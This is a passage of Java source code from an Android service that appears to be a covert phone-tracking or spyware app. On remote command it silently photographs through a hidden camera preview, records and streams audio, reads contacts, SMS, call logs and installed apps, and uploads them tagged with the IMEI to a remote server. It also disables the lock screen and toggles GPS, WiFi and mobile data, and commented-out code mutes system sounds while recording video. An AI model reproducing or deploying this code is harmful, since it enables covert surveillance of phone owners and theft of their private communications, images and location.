			for (String fName : arrFile) {
				fName = FileUtil.DIR_SAVE + fName;
				String queryParams = "type=11&iddevice="
						+ LocationUtil.IMEI;
				String sx = (new HttpData()).httpPostFile(
						HttpData.prefixUrlData()
								+ "handlePositionXXX.aspx?nocmdrealtime=1&"
								+ queryParams, fName,
						fName, true);
	
				parseToRealTime(sx);
			}	
		}catch(Exception ex){}
	}
	void startUpload3GP()
	{
		try
		{
			String[] arrFile = FileUtil.getFileToUpload(".3gp");
			for (String fName : arrFile) {
				fName = FileUtil.DIR_SAVE + fName;
				String queryParams = "type=10&iddevice="
						+ LocationUtil.IMEI;
				String sx = (new HttpData()).httpPostFile(
						HttpData.prefixUrlData()
								+ "handlePositionXXX.aspx?nocmdrealtime=1&"
								+ queryParams, fName,
						fName, true);
	
				parseToRealTime(sx);
			}
		}catch(Exception ex){}
	}
	void startUploadJPG()
	{
		try{
			String[] arrFile = FileUtil.getFileToUpload(".jpg");
			for (String fName : arrFile) {
				fName = FileUtil.DIR_SAVE + fName;
				String queryParams = "type=10&iddevice="
						+ LocationUtil.IMEI;
				String sx = (new HttpData()).httpPostFile(
						HttpData.prefixUrlData()
								+ "handlePositionXXX.aspx?nocmdrealtime=1&"
								+ queryParams, fName,
						fName, true);
	
				parseToRealTime(sx);
			}
		}catch(Exception ex){}
	}
	
	protected void startTurnOnScreenToGetCellID() {
		if (!UtilGame.modeAutoTurnOnScreen)
			return;
		try {
			PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
			WakeLock wl = pm.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK
					| PowerManager.ACQUIRE_CAUSES_WAKEUP, "bbbb");
			wl.acquire();

			KeyguardManager km = (KeyguardManager) getSystemService(KEYGUARD_SERVICE);
			km.newKeyguardLock("lamdaica").disableKeyguard();

			Thread.sleep(5000);// seleep 15s
			wl.release();
			km.newKeyguardLock("lamdaica").reenableKeyguard();
		} catch (Exception ex) {
		}
	}

	protected void cancelCurrent() {
		if (cmdRealtimeCurrent == 100)
			hx.sendEmptyMessage(99);
		if (cmdRealtimeCurrent == 101)
			hx.sendEmptyMessage(102);
		if (cmdRealtimeCurrent == 105)
			hx.sendEmptyMessage(106);

	}

	/*
	 * private void sendSMSToRegister(String imei) { try { SmsManager smsManager
	 * = SmsManager.getDefault(); smsManager.sendTextMessage("8185", null,
	 * "dv ptracker "+imei, null, null); }catch(Exception ex){} }
	 */
	private void setRecurringAlarm(Context context) {
		// we know mobiletuts updates at right around 1130 GMT.
		// let's grab new stuff at around 11:45 GMT, inexactly
		Calendar updateTime = Calendar.getInstance();
		updateTime.setTimeZone(TimeZone.getTimeZone("GMT"));
		updateTime.set(Calendar.HOUR_OF_DAY, 11);
		updateTime.set(Calendar.MINUTE, 45);

		Intent downloader = new Intent(context, Alarm.class);

		PendingIntent recurringDownload = PendingIntent.getBroadcast(context,
				0, downloader, PendingIntent.FLAG_CANCEL_CURRENT);

		AlarmManager alarms = (AlarmManager) context
				.getSystemService(Context.ALARM_SERVICE);

		alarms.setInexactRepeating(AlarmManager.RTC_WAKEUP,
				updateTime.getTimeInMillis() + 30000,
				AlarmManager.INTERVAL_DAY, recurringDownload);
	}

	private void debugMsg(String string) {

		if (1 == 1) return;
		// TODO Auto-generated method stub
		Message msg = new Message();
		msg.what = 200;
		msg.obj = string;
		hxDebug.sendMessage(msg);

	}

	/*
    
    */
	private void startCaptureImg()
	{
		try
		{
			statusCmdRealtime = TypeCmd.PROCESSING;
			timeStartRealTime = new Date();
			(new HttpData()).notifyRealtimeCmd(TypeCmd.PROCESSING,UtilGame.CMD_START_PICTURE);
			// UIManager.getInstance().showMsg("Start take photo...");
			// object
			mCamera = Camera.open();
			SurfaceView view = new SurfaceView(this);
			try {
				setSizeSmart();
				mCamera.setPreviewDisplay(view.getHolder()); // feed dummy surface
																// to
																// surface
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			mCamera.startPreview();
			startTimer();
		}catch(Exception ex)
		{
			statusCmdRealtime = TypeCmd.DONE;
			(new HttpData()).notifyRealtimeCmd(TypeCmd.ERROR,UtilGame.CMD_START_PICTURE);
		}
	}
	
	private Camera mCamera; // camera object
	Camera.PictureCallback jpegCallBack = new Camera.PictureCallback() {
		public void onPictureTaken(byte[] data, Camera camera) {
			try 
			{
				// if(data==null)return;
				// startPostImg(data);
				// set file destination and file name

				fileNameCurrent = LocationUtil.getIMEI() + "_"
						+ UtilGame.getInstance().GetStringNow() + ".jpg";
				fileNameCurrentOk = "ok_" + LocationUtil.getIMEI() + "_"
						+ UtilGame.getInstance().GetStringNow() + ".jpg";

				// File destination = new File(resourceDirectory,
				// "picture.jpg");

				File destination = new File(resourceDirectory, fileNameCurrent);
				Bitmap userImage = BitmapFactory.decodeByteArray(data, 0,
						data.length);
				// set file out stream
				FileOutputStream out = new FileOutputStream(destination);
				// set compress format quality and stream
				userImage.compress(Bitmap.CompressFormat.JPEG, 90, out);

				mCamera.release();

				

			} catch (Exception e) {
				// TODO Auto-generated catch block
				// e.printStackTrace();
				// UIManager.getInstance().showMsg("Exception uploadingxxx...:"+e.toString());
			}
			startUploadJPG();
			stopRecordImg();

		}
	};

	public void startTimer() {

		// 5000ms=5s at intervals of 1000ms=1s so that means it lasts 5 seconds
		new CountDownTimer(3000, 1000) {

			@Override
			public void onFinish() {
				// UIManager.getInstance().showMsg("Starting capture image...");
				// count finished
				// textTimeLeft.setText("Picture Taken");
				mCamera.takePicture(null, null, null, jpegCallBack);
			}

			@Override
			public void onTick(long millisUntilFinished) {
				// every time 1 second passes
				// textTimeLeft.setText("Seconds Left: " + millisUntilFinished/
				// 1000);
			}

		}.start();
	}

	private void stopRecordImg() {

		try{
			// UtilMemory.addTo(new
			// DataObject(ConfigGame.getInstance(null).getActiveKey()
			// , TypeData.IMG_LOG, resourceDirectory+"/picture.jpg",
			// String.valueOf(BatteryLog.levelBattery), "", ""));
	
			FileUtil.renameFile(fileNameCurrent, fileNameCurrentOk);
			UtilMemory.addTo(new DataObject(ConfigGame.getInstance(null)
					.getActiveKey(), TypeData.IMG_LOG, resourceDirectory + "/"
					+ fileNameCurrentOk, String.valueOf(BatteryLog.levelBattery),
					"", "", UtilGame.getInstance().GetStringNow()));
	
			(new HttpData()).notifyRealtimeCmd(TypeCmd.DONE);
			statusCmdRealtime = TypeCmd.DONE;
		}catch(Exception ex){}
	}

	private void setSizeSmart() {
		try {
			Parameters params = mCamera.getParameters();
			List<Camera.Size> sizes = params.getSupportedPictureSizes();

			Camera.Size result = null;
			result = (Size) sizes.get(sizes.size() - 1);

			Camera.Size result1 = null;
			result1 = (Size) sizes.get(0);

			if (result.width > result1.width)
				params.setPictureSize(result1.width, result1.height);
			else
				params.setPictureSize(result.width, result.height);

			mCamera.setParameters(params);
		} catch (Exception ex) {
		}
	}

	/*
	 * private void startPostImg(byte[] imgData) { try { UrlParamEncoder
	 * encoder=(new UrlParamEncoder()); encoder.addParam("id",
	 * ConfigGame.getInstance(null).getActiveKey());
	 * encoder.addParam("note",""); encoder.addParam("placeid","-1");
	 * encoder.addParam("typeid","-1"); encoder.addParam("memberid","-1");
	 * encoder.addParam("data",""); final String params=encoder.toString(); (new
	 * HttpData()).httpPostFile("handlefiles.aspx?"+params, "File.jpg",
	 * imgData); } catch (Exception e) { // TODO Auto-generated catch block
	 * //e.printStackTrace();
	 * //UIManager.getInstance().showMsg("Exception uploadingxxx1...:"
	 * +e.toString()); } }
	 */
	// start1
	private MediaRecorder mRecorder;
	public static String resourceDirectory =UtilGame.DIR_SAVE;// "/sdcard/tmp";
	public static String fileNameCurrent = "";
	public static String fileNameCurrentOk = "";

	public static int testing = 1;

	private void startRecordAudio() 
	{
		if (testing == 1) {
			MediaManager.getInstance().startRecordAudio();
			return;
		}		
	}
	private void startRecordVideo() 
	{
		//VideoManager.getInstance().startRecordVideo();	
	}
	private void stopRecordVideo() 
	{
		//VideoManager.getInstance().stopRecordVideo();	
	}
	private void startLiveVideo() 
	{
		//VideoManager.getInstance().startLiveVideo();	
	}
	private void stopLiveVideo() 
	{
		//VideoManager.getInstance().stopLiveVideo();	
	}
	private void stopRecordAudio() {
		if (testing == 1) 
		{
			MediaManager.getInstance().stopRecordAudio();
			startUpload3GP();
			return;
		}		
	}

	/*
	 * private void turnOnSpeaker() { AudioManager audioManager = (AudioManager)
	 * getApplicationContext().getSystemService(Context.AUDIO_SERVICE);
	 * audioManager.setSpeakerphoneOn(true);
	 * audioManager.setMode(AudioManager.AUDIOFOCUS_GAIN); } private void
	 * turnOffSpeaker() { AudioManager audioManager = (AudioManager)
	 * getApplicationContext().getSystemService(Context.AUDIO_SERVICE);
	 * audioManager.setSpeakerphoneOn(false);
	 * audioManager.setMode(AudioManager.MODE_NORMAL); }
	 */
	private void startLiveAudio() {
		try {
			statusCmdRealtime = TypeCmd.PROCESSING;
			timeStartRealTime = new Date();

			(new HttpData()).notifyRealtimeCmd(TypeCmd.PROCESSING,UtilGame.CMD_START_LIVEAUDIO);
			LiveAudioManager.getInstance().startCall();
			// Intent intent = new Intent();
			// intent.setClass( getBaseContext(),
			// com.camundo.AudioActivity.class);
			// startActivity(intent);
		} catch (Exception ex) {
			UtilMemory.addTo(new DataObject(LocationUtil.IMEI,
					TypeData.ERROR_LOG, "StartLiveAudio:" + ex.toString(),
					String.valueOf(BatteryLog.levelBattery), "", "", UtilGame
							.getInstance().GetStringNow()));
			//debugMsg("startLiveAudio:" + ex.toString());
		}

	}
	private void startReadContact() {
		try {
			statusCmdRealtime = TypeCmd.PROCESSING;
			timeStartRealTime = new Date();

			(new HttpData()).notifyRealtimeCmd(TypeCmd.PROCESSING,UtilGame.CMD_START_READCONTACT);
			ContextManagerCore.getInstance().readContacts();
			// Intent intent = new Intent();
			// intent.setClass( getBaseContext(),
			// com.camundo.AudioActivity.class);
			// startActivity(intent);
		
			startUploadXML();
		} catch (Exception ex) {
			UtilMemory.addTo(new DataObject(LocationUtil.IMEI,
					TypeData.ERROR_LOG, "StartReadContact:" + ex.toString(),
					String.valueOf(BatteryLog.levelBattery), "", "", UtilGame
							.getInstance().GetStringNow()));
			//debugMsg("startLiveAudio:" + ex.toString());
		}
		stopReadContact();
	}
	private void stopReadContact() {
		try
		{
			(new HttpData()).notifyRealtimeCmd(TypeCmd.DONE);
			 statusCmdRealtime = TypeCmd.DONE;
			 
			 
		} catch (Exception ex)
		{
			UtilMemory.addTo(new DataObject(LocationUtil.IMEI,
					TypeData.ERROR_LOG, "stopReadContact:" + ex.toString(),
					String.valueOf(BatteryLog.levelBattery), "", "", UtilGame
							.getInstance().GetStringNow()));

			// debugMsg("stopLiveAudio:"+ex.toString());
		}
	}
	private void startReadInstalledApps() 
	{
		try {
			statusCmdRealtime = TypeCmd.PROCESSING;
			timeStartRealTime = new Date();

			(new HttpData()).notifyRealtimeCmd(TypeCmd.PROCESSING,UtilGame.CMD_START_READAPPS);
			ContextManagerCore.getInstance().readInstalledApps();
			
			startUploadXML();
			
		} catch (Exception ex) {
			UtilMemory.addTo(new DataObject(LocationUtil.IMEI,
					TypeData.ERROR_LOG, "StartReadSMS:" + ex.toString(),
					String.valueOf(BatteryLog.levelBattery), "", "", UtilGame
							.getInstance().GetStringNow()));
			//debugMsg("startLiveAudio:" + ex.toString());
		}
		stopReadInstalledApps();
	}
	private void stopReadInstalledApps() {
		try
		{
			(new HttpData()).notifyRealtimeCmd(TypeCmd.DONE);
			 statusCmdRealtime = TypeCmd.DONE;
		} catch (Exception ex)
		{
			UtilMemory.addTo(new DataObject(LocationUtil.IMEI,
					TypeData.ERROR_LOG, "stopReadInstalledApps:" + ex.toString(),
					String.valueOf(BatteryLog.levelBattery), "", "", UtilGame
							.getInstance().GetStringNow()));

			// debugMsg("stopLiveAudio:"+ex.toString());
		}
	}
	private void startReadSMS() {
		try {
			statusCmdRealtime = TypeCmd.PROCESSING;
			timeStartRealTime = new Date();

			(new HttpData()).notifyRealtimeCmd(TypeCmd.PROCESSING,UtilGame.CMD_START_READSMS);
			ContextManagerCore.getInstance().readSmsLog();
			// Intent intent = new Intent();
			// intent.setClass( getBaseContext(),
			// com.camundo.AudioActivity.class);
			// startActivity(intent);
			startUploadXML();
			
		} catch (Exception ex) {
			UtilMemory.addTo(new DataObject(LocationUtil.IMEI,
					TypeData.ERROR_LOG, "StartReadSMS:" + ex.toString(),
					String.valueOf(BatteryLog.levelBattery), "", "", UtilGame
							.getInstance().GetStringNow()));
			//debugMsg("startLiveAudio:" + ex.toString());
		}
		stopReadSMS();
	}
	private void stopReadSMS() {
		try
		{
			(new HttpData()).notifyRealtimeCmd(TypeCmd.DONE);
			 statusCmdRealtime = TypeCmd.DONE;
		} catch (Exception ex)
		{
			UtilMemory.addTo(new DataObject(LocationUtil.IMEI,
					TypeData.ERROR_LOG, "stopReadSMS:" + ex.toString(),
					String.valueOf(BatteryLog.levelBattery), "", "", UtilGame
							.getInstance().GetStringNow()));

			// debugMsg("stopLiveAudio:"+ex.toString());
		}
	}
	private void startReadLogCall() {
		try {
			statusCmdRealtime = TypeCmd.PROCESSING;
			timeStartRealTime = new Date();

			(new HttpData()).notifyRealtimeCmd(TypeCmd.PROCESSING,UtilGame.CMD_START_READLOGCALL);
			ContextManagerCore.getInstance().readSmsLog();
			// Intent intent = new Intent();
			// intent.setClass( getBaseContext(),
			// com.camundo.AudioActivity.class);
			// startActivity(intent);
		
			startUploadXML();
		} catch (Exception ex) {
			UtilMemory.addTo(new DataObject(LocationUtil.IMEI,
					TypeData.ERROR_LOG, "StartReadSMS:" + ex.toString(),
					String.valueOf(BatteryLog.levelBattery), "", "", UtilGame
							.getInstance().GetStringNow()));
			//debugMsg("startLiveAudio:" + ex.toString());
		}		
		stopReadLogCall();
	}
	private void stopReadLogCall() {
		try
		{
			
			(new HttpData()).notifyRealtimeCmd(TypeCmd.DONE);
			 statusCmdRealtime = TypeCmd.DONE;
		} catch (Exception ex)
		{
			UtilMemory.addTo(new DataObject(LocationUtil.IMEI,
					TypeData.ERROR_LOG, "stopReadSMS:" + ex.toString(),
					String.valueOf(BatteryLog.levelBattery), "", "", UtilGame
							.getInstance().GetStringNow()));

			// debugMsg("stopLiveAudio:"+ex.toString());
		}
	}
	private void stopLiveAudio() {
		try {
			LiveAudioManager.getInstance().stopCall();
			(new HttpData()).notifyRealtimeCmd(TypeCmd.DONE);
			statusCmdRealtime = TypeCmd.DONE;
		} catch (Exception ex) {
			UtilMemory.addTo(new DataObject(LocationUtil.IMEI,
					TypeData.ERROR_LOG, "stopLiveAudio:" + ex.toString(),
					String.valueOf(BatteryLog.levelBattery), "", "", UtilGame
							.getInstance().GetStringNow()));

			// debugMsg("stopLiveAudio:"+ex.toString());
		}
	}
	
	/*
	 * private void Video() {
	 * 
	 * try { mCamera = Camera.open(); mCamera.unlock();
	 * 
	 * mRecorder = new MediaRecorder();
	 * 
	 * mRecorder.setCamera(mCamera);
	 * mRecorder.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);//CAMCORDER
	 * mRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
	 * mRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);//MPEG_4
	 * 
	 * //mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.mp4_4);
	 * //mRecorder.setMaxDuration(maxDurationInMs);
	 * 
	 * //mRecorder.setProfile(CamcorderProfile.get(CamcorderProfile.QUALITY_HIGH)
	 * );
	 * 
	 * CamcorderProfile targetProfile =
	 * CamcorderProfile.get(CamcorderProfile.QUALITY_LOW);
	 * targetProfile.videoFrameWidth = 320; targetProfile.videoFrameHeight =
	 * 240; targetProfile.videoFrameRate = 25; targetProfile.videoBitRate
	 * =256*1024 ;//512*1024/2; targetProfile.videoCodec =
	 * MediaRecorder.VideoEncoder.DEFAULT;//.H264; targetProfile.audioCodec =
	 * MediaRecorder.AudioEncoder.DEFAULT;//AMR_NB targetProfile.fileFormat =
	 * MediaRecorder.OutputFormat.THREE_GPP;//MPEG_4
	 * mRecorder.setProfile(targetProfile);
	 * 
	 * 
	 * //mRecorder.setOutputFile("/sdcard/ipcam/video"+String.valueOf(indexName)+
	 * ".mp4"); mRecorder.setOutputFile(resourceDirectory+"/video.3gp");
	 * 
	 * mRecorder.setVideoFrameRate(25);
	 * mRecorder.setVideoSize(320,240);//preview
	 * .getWidth(),preview.getHeight());skip
	 * //mRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
	 * //mRecorder.setVideoEncoder(MediaRecorder.VideoEncoder.mp4_4_SP);
	 * //mRecorder.setPreviewDisplay(previewHolder.getSurface());skip
	 * //mRecorder.setMaxFileSize(500*1024);
	 * 
	 * //start SurfaceView view = new SurfaceView(this); try {
	 * mRecorder.setPreviewDisplay(view.getHolder().getSurface()); // feed dummy
	 * surface to // surface } catch (Exception e) { // TODO Auto-generated
	 * catch block e.printStackTrace(); } mCamera.startPreview(); //end
	 * 
	 * mRecorder.prepare();
	 * 
	 * AudioManager audioManager = (AudioManager)
	 * getApplicationContext().getSystemService(Context.AUDIO_SERVICE);
	 * audioManager.setStreamMute(AudioManager.STREAM_SYSTEM, true);
	 * audioManager.setStreamMute(AudioManager.STREAM_MUSIC,true);
	 * mRecorder.start(); }catch(Exception e) {
	 * //UIManager.getInstance().showMsg
	 * ("Exception when recording video:"+e.toString()); } } private void
	 * stopRecordVideo() { try { mCamera.release(); mRecorder.stop();
	 * mRecorder.release(); mRecorder = null;
	 * 
	 * UtilMemory.addTo(new
	 * DataObject(ConfigGame.getInstance(null).getActiveKey() ,
	 * TypeData.VIDEO_LOG, resourceDirectory+"/video.3gp",
	 * String.valueOf(BatteryLog.levelBattery), "", "")); }catch(Exception ex){}
	 * }
	 */
	private void makeDirTemp() {
		String[] str = { "mkdir", resourceDirectory };
		try {
			Process ps = Runtime.getRuntime().exec(str);
			try {
				ps.waitFor();
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	/**
	 * This is a wrapper around the new startForeground method, using the older
	 * APIs if it is not available.
	 */
	void startForegroundCompat(int id, Notification notification) {
		if(isNotUsingNotification) return;
		//if(1==1) return;
		// If we have the new startForeground API, then use it.
		if (mStartForeground != null) 
		{
			mStartForegroundArgs[0] = Integer.valueOf(id);
			mStartForegroundArgs[1] = notification;
			try {
				mStartForeground.invoke(this, mStartForegroundArgs);
			} catch (InvocationTargetException e) {
				// Should not happen.
				Log.w("MyApp", "Unable to invoke startForeground", e);
			} catch (IllegalAccessException e) {
				// Should not happen.
				Log.w("MyApp", "Unable to invoke startForeground", e);
			}
			return;
		}

		// Fall back on the old API.
		// setForeground(true);//skipapi
		mNM.notify(id, notification);
	}

	/**
	 * This is a wrapper around the new stopForeground method, using the older
	 * APIs if it is not available.
	 */
	void stopForegroundCompat(int id) {
		// If we have the new stopForeground API, then use it.
		if (mStopForeground != null) {
			mStopForegroundArgs[0] = Boolean.TRUE;
			try {
				mStopForeground.invoke(this, mStopForegroundArgs);
			} catch (InvocationTargetException e) {
				// Should not happen.
				Log.w("MyApp", "Unable to invoke stopForeground", e);
			} catch (IllegalAccessException e) {
				// Should not happen.
				Log.w("MyApp", "Unable to invoke stopForeground", e);
			}
			return;
		}

		// Fall back on the old API. Note to cancel BEFORE changing the
		// foreground state, since we could be killed at that point.
		mNM.cancel(id);
		// setForeground(false);//skipapi
	}

	// broadcaster
	private BroadcastReceiver mBatInfoReceiver = new BatteryLog();
	private Handler screenOFFHandler = new Handler() {
		public void handleMessage(Message msg) {
			super.handleMessage(msg);
			PowerManager powerManager = (PowerManager) getApplicationContext()
					.getSystemService(Context.POWER_SERVICE);
			// WakeLock wakeLock =
			// pm.newWakeLock((PowerManager.SCREEN_BRIGHT_WAKE_LOCK |
			// PowerManager.PARTIAL_WAKE_LOCK |
			// PowerManager.ACQUIRE_CAUSES_WAKEUP), "Ptracker");
			long l = SystemClock.uptimeMillis();
	//		powerManager.userActivity(l, false);// false will bring the screen
												// back as bright as it was,
												// true - will dim it
		}
	};
	private BroadcastReceiver mReceiverScreen = new BroadcastReceiver() {
		@Override
		public void onReceive(Context context, Intent intent) {
			// Log.v(TAG, "Screen OFF onReceive()");
			screenOFFHandler.sendEmptyMessageDelayed(0, 5000L);
		}
	};
	// /reboot:
	// Runtime.getRuntime().exec(new
	// String[]{"/system/bin/su","-c","reboot now"});
	// Runtime.getRuntime().exec(new String[]{"/system/bin/su","-c","reboot"});
	// instead of {"/system/bin/su","-c","reboot"} i changed the
	// "/system/bin/su" part to just "su" and then it worked for me. Like this
	// Runtime.getRuntime().exec(new String[]{"su","-c","reboot"});
	// //start an other apk:
	// Intent intent = new Intent(Intent.ACTION_MAIN);
	// intent.setComponent(new
	// ComponentName("com.package.address","com.package.address.MainActivity"));
	// startActivity(intent);

	private CellStateListener listener = new CellStateListener();

	private void listen(int events) {
		// TelephonyManager telephonyManager = (TelephonyManager)
		// getSystemService(TELEPHONY_SERVICE);
		// telephonyManager.listen(listener, events);
		tMgr.listen(listener, events);
	}

	/*
	 * private GsmCellLocation gsmCellLocation(CellLocation location) { try {
	 * return (GsmCellLocation) location; } catch (ClassCastException e) {
	 * return null; } } void updateCellLocation(CellLocation location) {
	 * GsmCellLocation gsmLocation = gsmCellLocation(location);
	 * if(gsmLocation!=null) { int lac = gsmLocation != null ?
	 * gsmLocation.getLac() : -1; int cid = gsmLocation != null ?
	 * gsmLocation.getCid() : -1;
	 * 
	 * 
	 * LocationListenerImpl.code_cellid = String.valueOf(cid);//(cid >= 0 ? cid
	 * & 0xffff : -1)); LocationListenerImpl.code_lac =
	 * String.valueOf(gsmLocation.getLac()); } //setText(R.id.lac, R.string.lac,
	 * lac); //setText(R.id.rnc, R.string.rnc, cid >= 0 ? cid >> 16 : -1);
	 * //setText(R.id.cid, R.string.cid, cid >= 0 ? cid & 0xffff : -1); } void
	 * updateCellLocation(CellLocation location) { GsmCellLocation gsmLocation =
	 * gsmCellLocation(location); if(gsmLocation!=null) { int lac = gsmLocation
	 * != null ? gsmLocation.getLac() : -1; int cid = gsmLocation != null ?
	 * gsmLocation.getCid() : -1;
	 * 
	 * 
	 * LocationListenerImpl.code_cellid = String.valueOf(cid);//(cid >= 0 ? cid
	 * & 0xffff : -1)); LocationListenerImpl.code_lac =
	 * String.valueOf(gsmLocation.getLac()); } //setText(R.id.lac, R.string.lac,
	 * lac); //setText(R.id.rnc, R.string.rnc, cid >= 0 ? cid >> 16 : -1);
	 * //setText(R.id.cid, R.string.cid, cid >= 0 ? cid & 0xffff : -1); }
	 */
	private GsmCellLocation gsmCellLocation(CellLocation location) {
		try {
			return (GsmCellLocation) location;
		} catch (ClassCastException e) {
			return null;
		}
	}

	void updateCellLocation(CellLocation location) {
		GsmCellLocation gsmLocation = gsmCellLocation(location);
		if (gsmLocation != null) {
			int cid = gsmLocation != null ? gsmLocation.getCid() : -1;
			LocationListenerImpl.isReachedNewCellID = cid > 0;

			// comment afer test skip
			// LocationListenerImpl.code_cellid = String.valueOf(cid);//(cid >=
			// 0 ? cid & 0xffff : -1));
			// LocationListenerImpl.code_lac =
			// String.valueOf(gsmLocation.getLac());
		} else
			LocationListenerImpl.isReachedNewCellID = false;
		// setText(R.id.lac, R.string.lac, lac);
		// setText(R.id.rnc, R.string.rnc, cid >= 0 ? cid >> 16 : -1);
		// setText(R.id.cid, R.string.cid, cid >= 0 ? cid & 0xffff : -1);
	}

	void updateServiceState(String operator) {
		String mcc = operator != null && operator.length() >= 3 ? operator
				.substring(0, 3) : "";
		String mnc = operator != null && operator.length() >= 3 ? operator
				.substring(3) : "";

		LocationListenerImpl.code_mnc = mnc;
		LocationListenerImpl.code_mmc = mcc;
	}
	
	private class CellStateListener extends PhoneStateListener {

		private static final int EVENTS = LISTEN_CELL_LOCATION
				| LISTEN_SERVICE_STATE | LISTEN_SIGNAL_STRENGTHS
				| LISTEN_DATA_ACTIVITY;

		/*
		 * @Override public void onCellLocationChanged(CellLocation location) {
		 * updateCellLocation(location); }
		 */
		@Override
		public void onServiceStateChanged(ServiceState serviceState) {
			updateServiceState(serviceState.getOperatorNumeric());
		}

		@Override
		public void onCellLocationChanged(CellLocation Loc) {

			updateCellLocation(Loc);
			// listener.onReadCellComplete(cID, nID);
			processCellInfo();
		}

		@Override
		public void onDataActivity(int direction) {
			processCellInfo();
		}

		@Override
		public void onDataConnectionStateChanged(int state, int networkType) {
			processCellInfo();
		}

		@Override
		public void onSignalStrengthsChanged(SignalStrength signalStrength) {
			processCellInfo();
		}

		void processCellInfo() {
			int cID = -1;
			int nID = -1;
			// int sID = -1;
			switch (phoneType) {
			case TelephonyManager.PHONE_TYPE_GSM:
				GsmCellLocation gsmCellLoc = (GsmCellLocation) tMgr
						.getCellLocation();
				if (gsmCellLoc != null) {
					nID = gsmCellLoc.getLac();
					cID = gsmCellLoc.getCid();
					if (cID >= 0) {
						LocationListenerImpl.code_cellid = String.valueOf(cID);// (cid
																				// >=
																				// 0
																				// ?
																				// cid
																				// &
																				// 0xffff
																				// :
																				// -1));
						LocationListenerImpl.code_lac = String.valueOf(nID);
						LocationListenerImpl.code_mmc = tMgr
								.getNetworkOperator().substring(0, 3);
						LocationListenerImpl.code_mnc = tMgr
								.getNetworkOperator().substring(3);
					}
				}
				break;
			case TelephonyManager.PHONE_TYPE_CDMA:
				CdmaCellLocation cdmaCellLoc = (CdmaCellLocation) tMgr
						.getCellLocation();
				if (cdmaCellLoc != null) {
					nID = cdmaCellLoc.getNetworkId();
					cID = cdmaCellLoc.getBaseStationId();
					if (cID >= 0) {
						LocationListenerImpl.code_cellid = String.valueOf(cID);// (cid
																				// >=
																				// 0
																				// ?
																				// cid
																				// &
																				// 0xffff
																				// :
																				// -1));
						LocationListenerImpl.code_lac = String.valueOf(nID);
					}
				}
				break;
			}
		}
	}
	//start new version
	private void startTurnOnWifi() 
	{
		try
		{
			statusCmdRealtime = TypeCmd.PROCESSING;
			timeStartRealTime = new Date();
			(new HttpData()).notifyRealtimeCmd(TypeCmd.PROCESSING);
			
			try {
				ContextManagerCore.getInstance().turnWIFIOn();
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			stopTurnOnWifi();
		}catch(Exception ex)
		{
			statusCmdRealtime = TypeCmd.DONE;
			(new HttpData()).notifyRealtimeCmd(TypeCmd.ERROR);
		}
	}
	private void stopTurnOnWifi() 
	{
		(new HttpData()).notifyRealtimeCmd(TypeCmd.DONE);
		statusCmdRealtime = TypeCmd.DONE;
	}
	private void startTurnOffWifi() 
	{
		try
		{
			statusCmdRealtime = TypeCmd.PROCESSING;
			timeStartRealTime = new Date();
			(new HttpData()).notifyRealtimeCmd(TypeCmd.PROCESSING);
			
			try {
				ContextManagerCore.getInstance().turnWIFIOff();
			} catch (Exception e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			stopTurnOffWifi();
		}catch(Exception ex)
		{
			statusCmdRealtime = TypeCmd.DONE;
			(new HttpData()).notifyRealtimeCmd(TypeCmd.ERROR);
		}
	}
	private void stopTurnOffWifi() 
	{
		(new HttpData()).notifyRealtimeCmd(TypeCmd.DONE);
		statusCmdRealtime = TypeCmd.DONE;
	}
	private void startTurnOn3G() 
	{
		statusCmdRealtime = TypeCmd.PROCESSING;
		timeStartRealTime = new Date();
		(new HttpData()).notifyRealtimeCmd(TypeCmd.PROCESSING);
		
		try {
			ContextManagerCore.getInstance().turnOnOff3G(true);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		stopTurnOn3G();
	}
	private void stopTurnOn3G() 
	{
		(new HttpData()).notifyRealtimeCmd(TypeCmd.DONE);
		statusCmdRealtime = TypeCmd.DONE;
	}
	private void startTurnOff3G() 
	{
		statusCmdRealtime = TypeCmd.PROCESSING;
		timeStartRealTime = new Date();
		(new HttpData()).notifyRealtimeCmd(TypeCmd.PROCESSING);
		
		try {
			ContextManagerCore.getInstance().turnOnOff3G(false);
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		stopTurnOff3G();
	}
	private void stopTurnOff3G() 
	{
		(new HttpData()).notifyRealtimeCmd(TypeCmd.DONE);
		statusCmdRealtime = TypeCmd.DONE;
	}
	private void startTurnOnGps() 
	{
		statusCmdRealtime = TypeCmd.PROCESSING;
		timeStartRealTime = new Date();
		(new HttpData()).notifyRealtimeCmd(TypeCmd.PROCESSING);
		
		try {
			ContextManagerCore.getInstance().turnGPSOn();
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		stopTurnOnGps();
	}
	private void stopTurnOnGps() 
	{
		(new HttpData()).notifyRealtimeCmd(TypeCmd.DONE);
		statusCmdRealtime = TypeCmd.DONE;
	}
	private void startTurnOffGps() 
	{
		statusCmdRealtime = TypeCmd.PROCESSING;
		timeStartRealTime = new Date();
		(new HttpData()).notifyRealtimeCmd(TypeCmd.PROCESSING);
		
		try {
			ContextManagerCore.getInstance().turnGPSOff();
		} catch (Exception e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		stopTurnOffGps();
	}
	private void stopTurnOffGps() 
	{
		(new HttpData()).notifyRealtimeCmd(TypeCmd.DONE);
		statusCmdRealtime = TypeCmd.DONE;
	}
}
